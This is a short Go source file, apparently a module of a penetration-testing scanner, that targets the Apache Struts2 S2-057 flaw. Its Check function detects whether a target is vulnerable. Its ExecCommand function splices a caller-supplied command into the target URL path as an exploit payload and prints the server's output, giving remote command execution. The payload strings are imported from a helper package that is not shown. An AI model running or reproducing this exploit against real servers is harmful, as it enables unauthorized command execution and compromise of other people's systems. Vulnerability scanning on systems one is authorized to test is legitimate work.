package s2_057

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
    "strings"
)

func Check(targetUrl string) {
    actionIndex := strings.LastIndexAny(targetUrl, "/")
    targetUrl = targetUrl[:actionIndex] + utils.POC_s057_check + targetUrl[actionIndex:]
    // _ = utils.GetFunc4Struts2(targetUrl,"","")
    headerLocation := utils.Get302Location(targetUrl)
    if utils.IfContainsStr(headerLocation, "6308") {
        color.Red("*Found Struts2-057！")
    } else {
        fmt.Println("Struts2-057 Not Vulnerable.")
    }
}
func ExecCommand(targetUrl string, command string) {
    actionIndex := strings.LastIndexAny(targetUrl, "/")
    targetUrl = targetUrl[:actionIndex] + utils.POC_s057_exec(command) + targetUrl[actionIndex:]
    respString := utils.GetFunc4Struts2(targetUrl, "", "")
    fmt.Println(respString)
}
